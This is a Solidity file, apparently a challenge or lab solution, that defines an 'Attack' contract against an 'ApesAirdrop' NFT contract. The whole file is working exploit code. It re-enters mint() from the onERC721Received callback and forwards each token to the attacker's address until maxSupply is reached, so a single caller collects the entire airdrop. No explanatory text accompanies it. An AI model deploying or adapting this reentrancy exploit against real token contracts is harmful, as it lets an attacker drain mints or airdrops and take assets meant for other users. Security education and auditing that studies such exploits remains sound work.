// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IApesAirdrop {
    function maxSupply() external returns(uint256);
    function mint() external returns (uint16);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract Attack {

    IApesAirdrop apes;
    address public owner;
    uint16 private counter;

    constructor(address _bank) {
        owner = msg.sender;
        apes = IApesAirdrop(_bank);
        counter = 0;
    }

    function attack() external {
        apes.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        require(msg.sender == address(apes), "only apes nft can call it");
        apes.transferFrom(address(this), owner, tokenId);
        if (tokenId < apes.maxSupply()) {
            apes.mint();
        }
        return Attack.onERC721Received.selector;
    }

}